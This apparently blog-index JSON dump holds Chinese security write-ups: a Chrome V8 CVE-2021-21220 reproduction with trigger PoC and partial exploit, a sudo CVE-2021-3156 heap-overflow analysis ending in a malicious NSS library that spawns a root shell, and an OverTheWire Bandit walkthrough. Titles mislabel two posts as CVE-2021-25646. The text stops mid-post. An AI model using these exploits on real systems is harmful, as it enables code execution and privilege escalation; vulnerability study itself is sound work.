Summary了解以上内存保护机制的信息会为我们pwn提供一些信息。","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"程序保护机制","slug":"程序保护机制","permalink":"http://example.com/tags/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"}]},{"title":"CVE-2021-25646堆溢出漏洞复现及分析","slug":"CVE-2021-21220","date":"2021-04-10T17:24:39.000Z","updated":"2022-03-25T13:51:42.000Z","comments":true,"path":"2021/04/11/CVE-2021-21220/","link":"","permalink":"http://example.com/2021/04/11/CVE-2021-21220/","excerpt":"","text":"CVE-2021-21220在野0day漏洞简介Google chrome 90.0.4430.72之前版本中存在安全漏洞，该漏洞源于V8优化中的数据验证不足。 影响范围chrome&lt; 90.0.4430.72以及Microsoft Edge和其他可能基于Chromium的浏览器。 漏洞复现下载exp并利用 打开包含该漏洞的html页面，成功弹出计算器，执行恶意代码。 漏洞简析what’s V8V8是Chromium内核中的JavaScript引擎，负责对JavaScript代码进行解释优化与执行，而CVE-2020-16040(crbug.com/1150649)是V8优化编译器Turbofan在SimplifiedLowering阶段产生的一个整数溢出漏洞。 V8引擎工作流程 Parser(解析器)：负责通过对源代码进行词法分析得到的token对源代码进行语法错误分析、转换为AST抽象语法树并确定词法作用域： Demo: Ignition(解释器)：负责将 AST 转换为中间代码即字节码(Bytecode)并逐行解释执行字节码，在该阶段， JavaScript 代码就已经开始执行了。 考虑如下代码bytecode.js： 1234let ziwu_add = (x,y) =&gt; &#123;return x + y;&#125;ziwu_add(1,2) 使用命令./d8 bytecode.js —allow-natives-syntax —print-bytecode —print-bytecode-filter ziwu_add可得到其字节码： 12345678910[generated bytecode for function: ziwu_add (0x1984082d26e1 &lt;SharedFunctionInfo ziwu_add&gt;)]Parameter count 3Register count 0Frame size 00x1984082d2826 @ 0 : 25 04 Ldar a10x1984082d2828 @ 2 : 35 03 00 Add a0, [0]0x1984082d282b @ 5 : ab Return Constant pool (size &#x3D; 0)Handler Table (size &#x3D; 0)Source Position Table (size &#x3D; 0) Add a0, [0]即字节码，他告诉V8我们是要执行一个加法操作。 TurboFan(优化编译器)负责将字节码和一些分析数据作为输入并生成优化的机器代码，当 Ignition 将 JavaScript 代码转换为字节码后，代码开始执行，V8 会一直观察 JavaScript 代码的执行情况，并记录执行信息，如每个函数的执行次数、每次调用函数时，传递的参数类型等。如果一个函数被调用的次数超过了内设的阈值，监视器就会将当前函数标记为热点函数（Hot Function），并将该函数的字节码以及执行的相关信息发送给 TurboFan。TurboFan 会根据执行信息做出一些进一步优化此代码的假设，在假设的基础上将字节码编译为优化的机器代码。如果假设成立，那么当下一次调用该函数时，就会执行优化编译后的机器代码，以提高代码的执行性能。当某一次调用传入的信息变化时，表示 TurboFan 的假设是错误的，此时优化编译生成的机器代码就不能再使用了，于是进行优化回退，重走原复杂函数逻辑。 优化Demo: 优化逻辑过程如下，考虑下述代码： 123456let ziwu_add = (x,y) =&gt; &#123;return x + y;&#125;ziwu_add(1,2);ziwu_add(&#x27;hack&#x27;,&#x27;you&#x27;);ziwu_add([],&#123;&#125;) V8在每次计算时需要先判断x、y的类型，然后执行相应的处理，但如果该函数要执行很多次呢？ 123456let ziwu_add = (x,y) =&gt; &#123;return x + y;&#125;for (var i=0;i&lt;0x10000;i++)&#123; ziwu_add(1+i,2)&#125; x参数持续变化，如果每次都要去判断类型是否过于繁琐，不够高效，Turbofan通过观察发现，经过了如此多的循环计算，x、y参数都是int类型，有理由相信下一次应该还是这样，那就不妨将x、y参数的类型假设为int，基于这个假设，我们可以将ziwu_add函数优化为简单的加法： 1add eax ebx; POC根据补丁发生变化的位置分析： 漏洞存在于 Chrome 的 JS 引擎的 JIT 编译器 Turbofan 当中，Instruction Selector阶段在处理ChangeInt32ToInt64节点时，会先检查 node 的 input 节点，如果 input 节点的操作码是 Load，那么会根据该 input节点的 LoadRepresentation 和 MachineRepresentation进行一些特殊的处理，如果判断该 input 节点的 MachineRepresentation 的类型是kWord32, 那么会根据 LoadRepresentation 是有符号的还是无符号的选择对应的指令，如果是有符号的选择X64Movsxlq，在x86指令集中是有符号扩展，如果是无符号的选择X64Movl， 在x86指令集中是无符号扩展。 漏洞的根源是V8 对ChangeInt32ToInt64的假设是该节点的输入必定被解释为一个有符号的Int32的值，所以无论 LoadRepresentation如何，都应该使用X64Movsxlq指令。 123456789101112131415161718192021222324252627void InstructionSelector::VisitChangeInt32ToInt64(Node* node) &#123; DCHECK_EQ(node-&gt;InputCount(), 1); Node* input = node-&gt;InputAt(0); if (input-&gt;opcode() == IrOpcode::kTruncateInt64ToInt32) &#123; node-&gt;ReplaceInput(0, input-&gt;InputAt(0)); &#125; X64OperandGenerator g(this); Node* const value = node-&gt;InputAt(0); if (value-&gt;opcode() == IrOpcode::kLoad &amp;&amp; CanCover(node, value)) &#123; LoadRepresentation load_rep = LoadRepresentationOf(value-&gt;op()); MachineRepresentation rep = load_rep.representation(); InstructionCode opcode; switch (rep) &#123; case MachineRepresentation::kBit:// Fall through. case MachineRepresentation::kWord8: opcode = load_rep.IsSigned() ? kX64Movsxbq : kX64Movzxbq; break; case MachineRepresentation::kWord16: opcode = load_rep.IsSigned() ? kX64Movsxwq : kX64Movzxwq; break; case MachineRepresentation::kWord32: opcode = load_rep.IsSigned() ? kX64Movsxlq : kX64Movl; break; default: UNREACHABLE();&#125; 触发漏洞POC 12345678910const arr = new Uint32Array([2 ** 31]);function foo() &#123;return (arr[0] ^ 0) + 1;&#125;console.log(foo()); //这一行输出-2147483647for (let i = 0; i &lt; 100000; i++)foo();console.log(&quot;after optimization&quot;);console.log(foo());//这一行输出2147483649 同样一个函数在优化前和优化后返回的结果不一致。在优化前，arr[0] ^ 0的结果用十六进制表示是0x80000000， 对于异或运算，JS 引擎会将结果看做一个有符号的 Int32 的值，所以异或的结果是-2147483648, 加上1 以后变成-2147483647。 但是为什么优化后的结果不一致了呢，我们可以观察程序运行过程中生成的 Turbofan 的图。arr[0] ^ 0这个表达式被优化成了一个Load节点， 对应下图中的 #81 节点，而(arr[0] ^0) + 1这个加法运算被优化成了#58 ChangeInt32ToInt64节点和#50 Int64Add节点，如下图中黄色高亮部分所示，在图中可以看到，Load 节点的 MachineRepresentation 是Word32，而LoadRepresentation的类型是Uint32， 故而 Turbofan 选择了movl指令，也就是无符号扩展指令，导致 Load 节点的值会被无符号扩展为 64 位，然后和 1 相加，最后结果自然是2147483649。 用调试器调试也可以验证，在执行到mov ecx, DWORD PTR [rcx] 这一行时，rcx寄存器指向的值为0x80000000, 无符号扩展变成了2147483648， 最后加上 1 变成了2147483649。 EXP构造123456789101112131415161718192021class LeakArrayBuffer extends ArrayBuffer &#123; constructor(size) &#123; super(size); this.slot = 0xb33f;//进行地址泄露 &#125; &#125;function foo(a) &#123; let x = -1; if (a) x = 0xFFFFFFFF; var arr = new Array(Math.sign(0 - Math.max(0, x, -1)));//构造长度为-1的数组 arr.shift(); let local_arr = Array(2); local_arr[0] = 5.1;//4014666666666666 let buff = new LeakArrayBuffer(0x1000);// arr[0] = 0x1122;//修改数组长度 return [arr, local_arr, buff]; &#125; for (var i = 0; i &lt; 0x10000; ++i) foo(false); gc(); gc(); [corrput_arr, rwarr, corrupt_buff] = foo(true); 通过代码Array(Math.sign(0 – Math.max(0, x, -1)))创建一个length为-1的数组，然后使用LeakArrayBuffer构造内存布局，将相对读写布局成绝对读写。 这里需要说明的是，由于chrome80以上版本启用了地址压缩，地址高4个字节，可以在构造的array后面的固定偏移找到。 先将corrupt_buffer的地址泄露，然后如下计算地址 (corrupt_buffer_ptr_low &amp; 0xffff0000) - ((corrupt_buffer_ptr_low &amp; 0xffff0000) % 0x40000) + 0x40000; 可以计算出高4字节。 同时结合0x02步骤中实现的相对读写和对象泄露，可实现绝对地址读写。@r4j0x00在issue 1196683中构造length为-1数组后，则通过伪造对象实现任意地址读写。 之后，由于WASM内存具有RWX权限，因此可以将shellcode拷贝到WASM所在内存，实现任意代码执行。","categories":[{"name":"CVE","slug":"CVE","permalink":"http://example.com/categories/CVE/"}],"tags":[{"name":"堆溢出","slug":"堆溢出","permalink":"http://example.com/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"},{"name":"CVE-2021-21220","slug":"CVE-2021-21220","permalink":"http://example.com/tags/CVE-2021-21220/"}]},{"title":"CVE-2021-25646堆溢出漏洞复现及分析","slug":"CVE-2021-3156","date":"2021-04-08T17:24:39.000Z","updated":"2022-03-25T13:51:42.000Z","comments":true,"path":"2021/04/09/CVE-2021-3156/","link":"","permalink":"http://example.com/2021/04/09/CVE-2021-3156/","excerpt":"","text":"CVE-2021-25646堆溢出漏洞复现及分析漏洞详情​ 当在类Unix的操作系统上执行命令时，非root用户可以使用sudo命令来以root用户身份执行命令。由于sudo错误地在参数中转义了反斜杠导致堆缓冲区溢出，从而允许任何本地用户（无论是否在sudoers文件中）获得root权限，无需进行身份验证，且攻击者不需要知道用户密码。 ​ 影响范围： ​ Sudo 1.8.2 - 1.8.31p2 ​ Sudo 1.9.0 - 1.9.5p1 漏洞原理分析​ 对于bash而言假如我们希望执行某个命令可以使用bash -c [command]来执行，如果我们希望以root的权限去执行某个命令的话可以直接sudo [cmd]，而如果我们希望以shell模式去执行某个命令的时候，可以使用sudo -i或者sudo -s参数，在参数说明里我们可以看到-i, --login run login shell as the target user; a command may also be specified， -s, --shell run shell as the target user; a command may also be specified，当我们使用上述参数时对于sudo的flags而言有两种情况： 使用sudo -s，设置MO DE_SHELL 使用sudo -i，设置MODE_SHELL|MODE_LOGIN_SHELL ​ 在src/parse_args.c里我们可以看到对于这种模式的参数处理，处理方式为将参数按照空格拼接起来，对于一些元字符使用反斜线进行转义处理，最终覆写了argv为ac这个指针数组。 ​ 源码分析： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/* * For shell mode we need to rewrite argv */ if (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123; char **av, *cmnd = NULL; int ac = 1; if (argc != 0) &#123; /* shell -c &quot;command&quot; */ char *src, *dst; //得到命令的长度 size_t cmnd_size = (size_t) (argv[argc - 1] - argv[0]) + strlen(argv[argc - 1]) + 1; cmnd = dst = reallocarray(NULL, cmnd_size, 2); if (cmnd == NULL) sudo_fatalx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;)); if (!gc_add(GC_PTR, cmnd)) exit(1); //拼接命令并且处理转移符 for (av = argv; *av != NULL; av++) &#123; for (src = *av; *src != &#x27;\\0&#x27;; src++) &#123; /* quote potential meta characters */ if (!isalnum((unsigned char)*src) &amp;&amp; *src != &#x27;_&#x27; &amp;&amp; *src != &#x27;-&#x27; &amp;&amp; *src != &#x27;$&#x27;) *dst++ = &#x27;\\\\&#x27;;//处理转义字符，&#x27;\\\\&#x27;表示反斜线 *dst++ = *src; &#125; *dst++ = &#x27; &#x27;; &#125; if (cmnd != dst) dst--; /* replace last space with a NUL */ *dst = &#x27;\\0&#x27;; ac += 2; /* -c cmnd */ &#125; //上述处理完毕后结果保存在dst指针指向的内存 av = reallocarray(NULL, ac + 1, sizeof(char *)); //分配新的内存保存拼接的命令 if (av == NULL) sudo_fatalx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;)); if (!gc_add(GC_PTR, av)) exit(1); av[0] = (char *)user_details.shell; /* plugin may override shell */ if (cmnd != NULL) &#123; av[1] = &quot;-c&quot;; av[2] = cmnd; &#125; av[ac] = NULL; //最后的形式为 shell -c cmnd(shell和环境变量相关，比如我这里是zsh，shell为/usr/bin/zsh) //最终用av覆写argv argv = av; argc = ac; &#125; ​ 随后在sudoers.c中的sudoers_policy_main函数中调用set_cmnd将命令行参数存放在一个堆上的数据结构user_args中，这里也对元字符做了处理，假如不是\\\\+space的形式就跳过元字符，否则拷贝到*to。那么假如我们的命令行参数以\\\\结尾，那么from[0]=&#39;\\\\&#39;;from[1]=NULL(注意NULL并非sapce范围)，此时from++指向空字符，下面将空字符拷贝到了*to并且from++后执行了NULL后面的字符，此时再次进行while循环判断时很明显这里是可以继续进入循环的(如果后一个字符不为NULL)，从而赋值得以继续进行，从而产生了溢出。 1234567891011121314151617if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; /* * When running a command via a shell, the sudo front-end * escapes potential meta chars. We unescape non-spaces * for sudoers matching and logging purposes. */ for (to = user_args, av = NewArgv + 1; (from = *av); av++) &#123; while (*from) &#123; if (from[0] == &#x27;\\\\&#x27; &amp;&amp; !isspace((unsigned char)from[1])) from++; *to++ = *from++; &#125; *to++ = &#x27; &#x27;; &#125; *--to = &#x27;\\0&#x27;; &#125; set_cmnd()存在越界写，溢出user_args堆缓冲区（size是在852-853行中计算）。根本原因就是，sudo默认 \\ 后面肯定跟着元字符，实际上后面只有1个结束符。 当from指向\\时，from[1]指向NULL字节，from[2]指向的就是环境变量的第一个字节了，执行*too=*from++，可以将后面的NULL字节拷贝到user_args的堆中，且让from++，从而避开了while(*from）判断是否读到NULL字节的检测，由于参数后面紧跟环境变量的值，因此通过设置环境变量的值来覆盖user_args堆后面的数据。 ​ 上述是我们的理论分析，在理论角度上看漏洞是存在的，但是我们在之前的漏洞中也见到过由于无法创造漏洞利用场景(比如我想提权但是exp里需要某个root用户给的capability)，这样的洞就非常鸡肋。那么在我们的分析里有几个理想条件，那么最后的这个场景，即反斜线作为cmd-line的最后一个字符从理论上来说是无法实现的，这里要求我们有MODE_SHELL|MODE_LOGIN_SHELL，而假如flag包含MODE_SHELL的话在我们之前的parse_args参数解析中就会将所有元字符给转义掉，也就是说会有两个反斜线，我们再按照代码走一遍会发现这样循环末尾的*from=NULL，因此会跳出循环。 ​ 再仔细对比一下二者的条件，二者的条件略有不同。我们的问题在于能否设置flag为MODE_SHELL以及MODE_RUN或者MODE_EDIT或者MODE_CHECK。 ​ 再看下解析参数的部分会发现好像还是不太行，假如我们使用-e参数设置MODE_EDIT或者使用-l参数设置MODE_CHECK，我们的MODE_SHELL参数就会被从valid_flags去掉。 12345678910//bug conditionif (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123; //... if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; &#125;&#125;//escape meta char conditionif (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123; //.. &#125; 1234567891011121314151617181920212223242526#define MODE_NONINTERACTIVE 0x00800000#define MODE_SHELL 0x00020000//parse_args.ccase &#x27;e&#x27;: if (mode &amp;&amp; mode != MODE_EDIT) usage_excl(1); mode = MODE_EDIT; sudo_settings[ARG_SUDOEDIT].value = &quot;true&quot;; valid_flags = MODE_NONINTERACTIVE;//这里 break; //...case &#x27;l&#x27;: if (mode) &#123; if (mode == MODE_LIST) SET(flags, MODE_LONG_LIST); else usage_excl(1); &#125; mode = MODE_LIST; valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST;//这里 //...if ((flags &amp; valid_flags) != flags) usage(1); ​ 最后作者发现了一个可以利用的地方(盲猜是通过全局搜flag找到的)，那就是如果我们去执行sudoedit，parse_args函数会自动设置MODE_EDIT，并且不会重置valid_flags，而valid_flags默认包含了MODE_SHELL。 123456789101112131415/* * Default flags allowed when running a command. */#define DEFAULT_VALID_FLAGS (MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL)int valid_flags = DEFAULT_VALID_FLAGS; /* First, check to see if we were invoked as &quot;sudoedit&quot;. */ proglen = strlen(progname); if (proglen &gt; 4 &amp;&amp; strcmp(progname + proglen - 4, &quot;edit&quot;) == 0) &#123; progname = &quot;sudoedit&quot;; mode = MODE_EDIT; sudo_settings[ARG_SUDOEDIT].value = &quot;true&quot;; &#125; ​ 也就是说，加入我们执行sudoedit -s，就同时兼具了MODE_SHELL|MODE_EDIT而没有MODE_RUN，因此可以成功到达漏洞点。 一个溢出demo： 1.堆溢出分析1.堆在内存中的位置 2.堆的结构 arena：通过sbrk或mmap系统调用为线程分配的堆区，按线程的类型可以分为2类： main arena：主线程建立的arena； thread arena：子线程建立的arena； bin：一个用以保存Free chunk链表的表头信息的指针数组，按所悬挂链表的类型可以分为4类: Fast bin：Fast bin 共有10个，存储了chunk size 从16到80的free chunk，这些free chunk被称作fast chunk Unsorted bin：当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中。 Small bin：小于512字节的chunk称之为small chunk，small bin就是用于管理small chunk的。 Large bin：大于512字节的chunk称之为large chunk，large bin就是用于管理这些large chunk的。 PS:libc2.26 之后的 Tcache 机制 Tcache bin :类似于fastbin一样的东西，每条链上最多可以有 7 个 chunk，free的时候当tcache满了才放入fastbin，unsorted bin，malloc的时候优先去tcache找。 区别：Max fast bins size is 0x80. Max tcache bins size is 0x410 mutex：互斥锁，防止多线程对chunk资源的竞争 Large bin： chunk：逻辑上划分的一小块内存，根据作用不同分为4类： Allocated chunk：即分配给用户且未释放的内存块； Free chunk：即用户已经释放的内存块； Top chunk：处于一个arena的最顶部的chunk Last Remainder chunk：对small bin的malloc机制的介绍中当用户请求的是一个small chunk，且该请求无法被small bin、unsorted bin满足的时候，就通过binmaps遍历bin查找最合适的chunk，如果该chunk有剩余部分的话，就将该剩余部分变成一个新的chunk加入到unsorted bin中，另外，再将该新的chunk变成新的last remainder chunk。 标志位： A:记录当前chunk是否属于主线程 M:记录当前chunk是否是由mmap分配 P:记录前一个chunk块是否被分配 Malloc Algorithm： 1.若malloc请求大小与tcache中某个chunk大小完全匹配，优先从tcache bins调用而不必向large bin发出请求。 2.若请求内存足够大，则调用mmap()直接向操作系统从内存中调用 3.若fast bin中有合适大小的块，则先从中分配 TO be continued…. Free Algorithm： 1.若tcache bins有空间，则优先将空闲块放入其中 2.如果块足够小，则优先放入fast bins中 TO be continued…. 从该调度算法可以看出，某个具体大小的chunk可以在tcache bins 中稳定存在一定时间并且不发生合并，这个机制可以为我们精准溢出到某个结构体前面附近提前进行占位。 漏洞利用思路：利用溢出覆写nss_library为X/X，从而加载自定义的库函数，进而get root shell。 知识背景： 1.glibc setlocalemain()函数较早调用了setlocale()函数，查阅源码我们发现此处进行了malloc操作，这样可以分配并释放几个LC环境变量（LC_CTYPE，LC_MESSAGES，LC_TIME等），这样就在Sudo的堆开头处留下了空闲的fast/tcache chunks 12345678// /src/sudo.c150: int main(int argc, char *argv[], char *envp[])151: &#123; ...171: setlocale(LC_ALL, &quot;&quot;); ...216: sudo_mode = parse_args(argc, argv, &amp;submit_optind, &amp;nargc, &amp;nargv, &amp;settings, &amp;env_add); 总之我们可以通过设置环境变量对堆进行修饰，得到指定大小的空闲chunk 并且该块在NSS结构体之前。由malloc机制不难分析出，我们控制好溢出大小很容易在tcache或者fast bins中占有该空闲块。 2.NSS（Name Service Switch）​ 每个Linux/Unix的操作系统中都有这样的一套称之为NSS的共享库来做一些解析，比如登录用户的用户名以及IP地址到域名的解析。比如对于DNS服务来说，它默认查看/etc/resolv.conf配置文件的内容进行解析，对于用户和组来说，它会默认查看/etc/passwd和/etc/group。其配置文件位于/etc/nsswitch.conf，其每行都规定了查找方法的规范，在GNU C Library里, 每个可用的SERVICE都必须有文件 /lib/libnss_SERVICE.so.1 与之对应。**也就是说，GNU将每个服务实现为不同的module(shared library)，因此可以在Linux系统中找到下列相应的共享库。** 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// 1. service_user 结构typedef struct service_user&#123;/* And the link to the next entry. */struct service_user *next;/* Action according to result. */lookup_actions actions[5];/* Link to the underlying library object. */service_library *library;/* Collection of known functions. */void *known;/* Name of the service (`files&#x27;, `dns&#x27;, `nis&#x27;, ...). */char name[0];&#125; service_user;// 2. nss_load_library() 函数static int nss_load_library (service_user *ni)&#123;if (ni-&gt;library == NULL) &#123; static name_database default_table; ni-&gt;library = nss_new_service (service_table ?: &amp;default_table, // （1）设置 ni-&gt;library ni-&gt;name); if (ni-&gt;library == NULL) return -1; &#125;if (ni-&gt;library-&gt;lib_handle == NULL) &#123; /* Load the shared library. */ size_t shlen = (7 + strlen (ni-&gt;name) + 3 + strlen (__nss_shlib_revision) + 1); int saved_errno = errno; char shlib_name[shlen]; /* Construct shared object name. */ __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name, // （2）伪造的库文件名必须是 libnss_xxx.so &quot;libnss_&quot;), ni-&gt;name), &quot;.so&quot;), __nss_shlib_revision); ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name); // （3）加载目标库 //continue long long function 分析代码可知：如果溢出后可以覆盖service_user结构。该结构出现在libc的nss_load_library()函数中，用于加载动态链接库。如果能覆盖service_user-&gt;name，就能指定加载我们伪造的库，利用root权限运行非root权限的库。 我们要做的就是利用溢出部分将ni-&gt;library == null，所以找到距离我们占位块最近的一个service_user结构体即可。 gdb调试技巧： search -s systemd 和 search -s mymachine 定位出现的结构体，找到位置最合适的一个。 Demo: 最后一步：伪造libnss_X/X.so.2库 Demo: 12345678910111213141516#include &lt;stdlib.h&gt;#include &lt;stddef.h&gt;#include &lt;unistd.h&gt;static int __attribute__((constructor)) ___init(void)&#123; char *argv[2] = &#123;&quot;sh&quot;, NULL&#125;; setuid(0); setgid(0); seteuid(0); setegid(0); return execve(&quot;/bin/sh&quot;, argv, NULL);&#125; 加载该库函数即可get shell. 总结基本思路是：通过输入特定环境变量，使得释放特定大小LC_ALL变量堆块占位到service_user结构体上方为目标来进行，使得service结构体加载自定义库函数。 在阅读Qualys的报告时注意到，在寻找利用点时使用了fuzz的方法，找到了三个较为稳定的利用点，这点值得以后深入了解。","categories":[{"name":"CVE","slug":"CVE","permalink":"http://example.com/categories/CVE/"}],"tags":[{"name":"堆溢出","slug":"堆溢出","permalink":"http://example.com/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"},{"name":"CVE-2021-3156","slug":"CVE-2021-3156","permalink":"http://example.com/tags/CVE-2021-3156/"}]},{"title":"linux_base题解","slug":"linux_Base","date":"2021-04-07T17:24:39.000Z","updated":"2022-03-25T13:51:43.000Z","comments":true,"path":"2021/04/08/linux_Base/","link":"","permalink":"http://example.com/2021/04/08/linux_Base/","excerpt":"","text":"linux_base题解重新系统地过一遍，主要是一些Linux的基本命令和基础知识。 Level_0What is SSH ?According to SearchSecurity, SSH is a network protocol that gives users, particularly system administrators, a secure way to access a computer over an unsecured network. Host Name : bandit.labs.overthewire.org Username : bandit0 Password : bandit0 Port Number : 2220 1ssh bandit0@bandit.labs.overthewire.org -p 2220 Level_0➡Level_1Usage of ls and cat:1234bandit0@bandit:~$ lsreadmebandit0@bandit:~$ cat readme boJ9jbbUNNfktd78OOpsqOltutMc3MY1 Level_1➡Level_2cat the file stars with dash:1234bandit1@bandit:~$ cat ./-CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9bandit1@bandit:~$ cat &lt;-CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 Level_2➡Level_3Use” \\“ to escape character1234bandit2@bandit:~$ lsspaces in this filenamebandit2@bandit:~$ cat spaces\\ in\\ this\\ filename UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK Level_3➡Level_4Usage of command : ls 、cd:The ls command is used to view the contents of a directory. By default, this command will display the contents of your current working directory. If you want to see the content of other directories, type ls and then the directory’s path. For example, enter ls /home/username/Documents to view the content of Documents. There are variations you can use with the ls command: ls -R will list all the files in the sub-directories as well ls -a will show the hidden files ls -al will list the files and directories with detailed information like the permissions, size, owner, etc. Hidden file: start with . is hidden file 123456789101112bandit3@bandit:~$ lsinherebandit3@bandit:~$ cd inhere/bandit3@bandit:~/inhere$ lsbandit3@bandit:~/inhere$ ls -altotal 12drwxr-xr-x 2 root root 4096 May 7 2020 .drwxr-xr-x 3 root root 4096 May 7 2020 ..-rw-r----- 1 bandit4 bandit3 33 May 7 2020 .hiddenbandit3@bandit:~/inhere$ cat .hidden pIwrPrtPN36QITSp3EQaw936yaFoFgAB Level_4➡Level_5Usage of command : file1file [-bcLvz][-f &lt;名称文件&gt;][-m &lt;魔法数字文件&gt;...][文件或目录...] -b 列出辨识结果时，不显示文件名称。 -c 详细显示指令执行过程，便于排错或分析程序执行的情形。 -f&lt;名称文件&gt; 指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。 -L 直接显示符号连接所指向的文件的类别。 -m&lt;魔法数字文件&gt; 指定魔法数字文件。 -v 显示版本信息。 -z 尝试去解读压缩文件的内容。 1234567891011121314151617181920bandit4@bandit:~$ lsinherebandit4@bandit:~$ cd inhere/bandit4@bandit:~/inhere$ ls-file00 -file02 -file04 -file06 -file08-file01 -file03 -file05 -file07 -file09bandit4@bandit:~/inhere$ file ./*./-file00: data./-file01: data./-file02: data./-file03: data./-file04: data./-file05: data./-file06: data./-file07: ASCII text./-file08: data./-file09: databandit4@bandit:~/inhere$ cat ./-file07koReBOKuIDDepwhWk7jZC0RTdopnAYKh Level_5➡Level_6Usage of file:12345678910bandit5@bandit:~/inhere$ lsmaybehere00 maybehere04 maybehere08 maybehere12 maybehere16maybehere01 maybehere05 maybehere09 maybehere13 maybehere17maybehere02 maybehere06 maybehere10 maybehere14 maybehere18maybehere03 maybehere07 maybehere11 maybehere15 maybehere19bandit5@bandit:~/inhere$ find ./ -type f -size 1033c./maybehere07/.file2bandit5@bandit:~/inhere$ cat ./maybehere07/.file2DXjZPULLxYr17uwoI01bNLQbtFemEgo7 Level_6➡Level_7Learn about redirection:Analyse: The password for the next level is stored somewhere on the server and has all of the following properties: owned by user bandit7 owned by group bandit6 33 bytes in size So this is exp: find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null / from root folder -user the owner of the file. -group the group owner of the file. -size the size of the file. 2&gt;/dev/null redirects error messages to null so that they do not show on stdout. 1234bandit6@bandit:~$ find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null/var/lib/dpkg/info/bandit7.passwordbandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs Level_7➡Level_8Learn about the pipe and usage if grep:grep commandIt lets you search through all the text in a given file. To illustrate, grep blue notepad.txt will search for the word blue in the notepad file. Lines that contain the searched word will be displayed fully. 1234567-i 忽略大小写-E 启用POSIX扩展正则表达式-P 启用perl正则-o 只输出正则表达式匹配的内容-w 整字匹配-v 不匹配的-n 输出行号 12bandit7@bandit:~$ cat data.txt |grep millionthmillionth cvX2JJa4CFALtqS87jk27qwqGhBM9plV Level_8➡Level_9Learn about the sort and uniq:sort: 1sort [-bcdfimMnr][-o&lt;输出文件&gt;][-t&lt;分隔字符&gt;][+&lt;起始栏位&gt;-&lt;结束栏位&gt;][--help][--verison][文件] -u 在输出行中去除重复行。 -r sort默认的排序方式是升序，如果想改成降序，就加个-r即可。 -n sort要以数值来排序 -t 指定分割符 -k 指定第几列排序 uniq: 1uniq [-cdu][-f&lt;栏位&gt;][-s&lt;字符位置&gt;][-w&lt;字符位置&gt;][--help][--version][输入文件][输出文件] -c, —count 在每行前显示该行重复次数 -d, —repeated 只输出重复的行 -D, —all-repeated 只输出重复的行，不过有几行输出几行 -f, —skip-fields=N -f 忽略的段数，-f 1 忽略第一段 -i, —ignore-case 不区分大小写 -s, —skip-chars=N 与-f有点像，不过-s是忽略，后面多少个字符 -s 5就忽略后面5个字符 -u, —unique 去除重复的后，全部显示出来，根mysql的distinct功能上有点像 1234bandit8@bandit:~$ lsdata.txtbandit8@bandit:~$ sort data.txt | uniq -uUsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR Level_9➡Level_10Usage of grep:strings : export strings in binary file 12345678910111213141516bandit9@bandit:~$ lsdata.txtbandit9@bandit:~$ cat data.txt |grep =Binary file (standard input) matchesbandit9@bandit:~$ strings data.txt |grep =========== the*2i&quot;4=:G e========== password&lt;I=zsGiZ)========== isA=|t&amp;EZdb=c^ LAh=3G*SF=s&amp;========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk Level_10➡Level_11What’s base64?Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由于，所以每6个比特为一个单元，对应某个可打印字符。3个字节相当于24个比特，对应于4个Base64单元，即3个字节可由4个可打印字符来表示。在Base64中的可打印字符包括字母A-Z、a-z、数字0-9，这样共有62个字符，此外两个可打印符号在不同的系统中而不同。一些如uuencode的其他编码方法，和之后BinHex的版本使用不同的64字符集来代表6个二进制数字，但是不被称为Base64。 why base64？ This_is_why_base64 12bandit10@bandit:~$ cat data.txt | base64 -dThe password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR Level_11➡Level_12ROT13:I_know_what’s_ROT13 command tr: 123456tr [选项]… 集合1 [集合2]选项说明：-c, -C, –complement 用集合1中的字符串替换，要求字符集为ASCII。-d, –delete 删除集合1中的字符而不是转换-s, –squeeze-repeats 删除所有重复出现字符序列，只保留第一个；即将重复出现字符串压缩为一个字符串。-t, –truncate-set1 先删除第一字符集较第二字符集多出的字符 12bandit11@bandit:~$ cat data.txt | tr &quot;A-Za-z&quot; &quot;N-ZA-Mn-za-m&quot;The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu Level_12➡Level_13Learn about hexdump&amp;xxd&amp;gzip&amp;bzip&amp;tar: Linux hexdump命令一般用来查看“二进制”文件的十六进制编码，但实际上它能查看任何文件，而不只限于二进制文件。 1hexdump [选项] [文件]... 123456789-n length 只格式化输入文件的前length个字节。-C 输出规范的十六进制和ASCII码。-b 